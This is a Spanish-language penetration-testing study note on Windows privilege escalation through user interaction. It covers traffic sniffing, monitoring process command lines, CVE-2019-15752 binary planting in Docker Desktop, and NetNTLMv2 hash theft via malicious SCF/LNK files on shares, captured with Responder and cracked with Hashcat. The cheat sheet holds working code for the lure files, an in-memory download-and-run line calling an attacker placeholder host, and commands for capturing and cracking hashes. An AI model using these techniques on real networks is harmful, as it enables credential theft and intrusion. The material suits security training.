---
tags:
  - windows
  - privex
---
## Conceptos Clave (TL;DR)

- Cuando se agotan los vectores clásicos de privesc local, la interacción del usuario (navegación a shares, ejecución de archivos, tareas programadas) se puede explotar para robar credenciales.
- Captura pasiva: si Wireshark está instalado y el driver Npcap no está restringido a Administradores, un usuario sin privilegios puede sniffear tráfico (FTP en texto claro, etc.).
- Captura activa: archivos maliciosos (.scf / .lnk) colocados en shares de uso frecuente fuerzan a Explorer a iniciar una sesión SMB contra un host controlado por el atacante, lo que permite capturar hashes NetNTLMv2 con Responder y crackearlos offline.
- Servicios vulnerables conocidos (ej. CVE-2019-15752 en Docker Desktop) pueden permitir plantar un ejecutable en un directorio con permisos débiles que se ejecuta cuando el usuario interactúa con la aplicación (login, reinicio del servicio).

## Herramientas Clave

- **Wireshark / tcpdump** - Captura de tráfico de red en vivo en la máquina objetivo o de ataque.
- **net-creds** - Extrae credenciales y hashes desde una interfaz en vivo o desde un archivo .pcap.
- **Get-WmiObject Win32_Process (script PowerShell)** - Monitorea líneas de comando de procesos para detectar credenciales pasadas por CLI.
- **Responder / Inveigh / InveighZero** - Poisoning LLMNR/NBT-NS/MDNS y servidor SMB falso para capturar hashes NetNTLMv2.
- **Hashcat** - Crackeo offline de hashes capturados (NetNTLMv2, etc.).
- **Lnkbomb** - Generación automatizada de archivos .lnk maliciosos.
- **WScript.Shell (PowerShell COM object)** - Generación manual de archivos .lnk maliciosos.

## Metodología Paso a Paso

**Fase 1 - Captura pasiva de tráfico**
1. Identificar si Wireshark está instalado en el host objetivo y si el acceso al driver Npcap está restringido a Administradores (por defecto NO lo está).
2. Si tienes acceso a una máquina de ataque dentro del entorno, ejecutar tcpdump/Wireshark o net-creds en segundo plano durante la evaluación para detectar credenciales en texto claro circulando por la red.

**Fase 2 - Monitoreo de líneas de comando de procesos**
1. Tras obtener una shell de usuario, ejecutar un script que compare el estado de los procesos cada segundo, buscando comandos que incluyan credenciales (tareas programadas, scripts de montaje de unidades, etc.).
2. Alojar el script en la máquina de ataque y descargarlo/ejecutarlo en memoria en el objetivo (IEX + iwr) para no tocar disco.
3. Analizar la diferencia (Compare-Object) entre snapshots para detectar líneas de comando efímeras (ej. `net use` con credenciales en claro).

**Fase 3 - Explotación de servicios vulnerables conocidos**
1. Enumerar software instalado a fondo (versiones específicas con CVEs conocidos de privesc por interacción de usuario, ej. Docker Desktop < 2.1.0.1).
2. Verificar permisos de escritura en directorios de búsqueda de binarios usados por la aplicación al iniciar (CVE-2019-15752: `C:\ProgramData\DockerDesktop\version-bin\` con permisos de escritura para `BUILTIN\Users`).
3. Si hay permisos de escritura, plantar un ejecutable malicioso con el nombre esperado por la aplicación.
4. Esperar a que se cumpla el trigger (reinicio del servicio o acción del usuario, ej. `docker login`) y comprobar periódicamente si el ejecutable corrió con privilegios elevados.

**Fase 4 - Captura de hashes vía archivo malicioso en share (SCF/LNK)**
1. Identificar un share con acceso de escritura que sea de uso frecuente (compartido de archivos, directorio de trabajo de un usuario).
2. Crear el archivo malicioso (.scf si el host es anterior a Server 2019; .lnk si es Server 2019 o superior, ya que SCF dejó de funcionar) apuntando vía ruta UNC a tu IP de atacante.
3. Nombrar el archivo de forma que pase desapercibido (similar a otros archivos del directorio) y, en el caso de SCF, prefijarlo con `@` para que aparezca primero en el listado y maximizar la probabilidad de que Explorer lo procese.
4. Subir el archivo malicioso al share.
5. Iniciar Responder en la máquina de ataque, escuchando en la interfaz correspondiente.
6. Esperar (normalmente 2-5 minutos) a que el usuario navegue al directorio que contiene el archivo malicioso; Explorer intentará resolver el icono vía SMB, disparando autenticación NTLM hacia tu Responder.
7. Capturar el hash NetNTLMv2 mostrado en la consola de Responder.
8. Crackear el hash offline con Hashcat usando un diccionario (ej. rockyou.txt).
9. Reutilizar la contraseña en texto claro para escalar privilegios localmente, en el dominio, o para movimiento lateral.

## Cheat Sheet de Comandos

```powershell
# Script de monitoreo continuo de líneas de comando de procesos.
# Compara cada segundo el listado de CommandLine de todos los procesos
# para detectar credenciales pasadas por CLI (tareas programadas, montajes de red, etc.)
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

```powershell
# Descarga y ejecuta en memoria (sin tocar disco) el script de monitoreo
# alojado en un servidor HTTP en tu máquina de ataque.
PS C:\htb> IEX (iwr 'http://<ATTACKER_IP>/procmon.ps1')
```

```text
# Contenido del archivo SCF malicioso.
# Guardar como @<NOMBRE_LEGITIMO>.scf -> el "@" lo posiciona primero en el listado del directorio
# para asegurar que sea visto/procesado por el Explorador de Windows.
# IconFile con ruta UNC hacia el atacante fuerza una sesión SMB al renderizar el icono.
# NOTA: Esta técnica NO funciona en hosts con Windows Server 2019 o superior (usar .lnk en su lugar).
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>\<FAKE_SHARE>\<FAKE_ICON>.ico
[Taskbar]
Command=ToggleDesktop
```

```powershell
# Genera un archivo .lnk malicioso mediante el objeto COM WScript.Shell.
# TargetPath con ruta UNC hacia el atacante: al acceder al directorio donde
# se guarda el .lnk, Explorer intenta resolver el icono/target y dispara
# una autenticacion SMB hacia el host atacante (capturable con Responder).
# Alternativa a SCF para hosts Windows Server 2019+ (donde SCF ya no funciona).
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("<LOCAL_PATH>\<FILENAME>.lnk")
$lnk.TargetPath = "\\<ATTACKER_IP>\<FAKE_FILE>"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

```bash
# Inicia Responder en modo escucha para capturar hashes NetNTLMv2.
# -w : habilita el rogue WPAD proxy server
# -r : responde a solicitudes NetBIOS dirigidas al nombre del workgroup
# -f : fingerprinting de los hosts que envian solicitudes LLMNR/NBT-NS
# -v : modo verbose (muestra mas detalle en consola)
# -I : interfaz de red a la que esta conectado tu adaptador de ataque/VPN
sudo responder -wrf -v -I <INTERFACE>
```

```bash
# Crackeo offline de un hash NetNTLMv2 capturado con Responder.
# -m 5600     : modo de hash correspondiente a NetNTLMv2
# <HASH_FILE>     : archivo de texto con el hash capturado (formato user::domain:challenge:response)
# <WORDLIST_PATH> : ruta al diccionario de contraseñas a usar
hashcat -m 5600 <HASH_FILE> <WORDLIST_PATH>
```

## Gotchas y Troubleshooting

- El instalador de Npcap no restringe el driver a Administradores por defecto; esto permite a usuarios sin privilegios capturar tráfico si Wireshark está instalado.
- SCF ya NO funciona en hosts con Windows Server 2019 o superior; en esos casos usar un archivo .lnk malicioso (manual con PowerShell o con Lnkbomb).
- El nombre del archivo SCF debe imitar archivos legítimos del directorio y empezar con `@` para aparecer primero en el listado y maximizar la probabilidad de ejecución por el Explorador.
- CVE-2019-15752 (Docker Desktop < 2.1.0.1) no garantiza acceso elevado inmediato: depende de que se reinicie el servicio Docker o de que el usuario ejecute `docker login`. En evaluaciones largas, plantar el ejecutable y revisar periódicamente si se ejecutó con privilegios elevados.
- El directorio vulnerable de Docker es `C:\ProgramData\DockerDesktop\version-bin\`; verificar permisos de escritura para `BUILTIN\Users` antes de plantar el ejecutable.
- Tras iniciar Responder, espera normalmente entre 2 y 5 minutos a que el usuario navegue al recurso compartido antes de obtener una captura.
- Responder puede fallar al iniciar el servidor SSL en el puerto 443 ("Error starting SSL server on port 443") por permisos insuficientes o por otro servicio ya escuchando en ese puerto; no impide la captura SMB/NTLM, pero conviene revisarlo si se necesita HTTPS.
- net-creds no requiere captura previa con Wireshark/tcpdump: puede ejecutarse directamente contra una interfaz en vivo o contra un archivo .pcap ya capturado.
- Ejemplo real de hallazgo vía monitoreo de procesos (Fase 2): un comando `net use` reveló credenciales de dominio en texto claro de la forma `net use T: \\<HOST>\<SHARE> /user:<DOMAIN>\<USER> <PASSWORD>`, útil tanto para acceder al host remoto como para revisar el share por credenciales adicionales (ej. de bases de datos).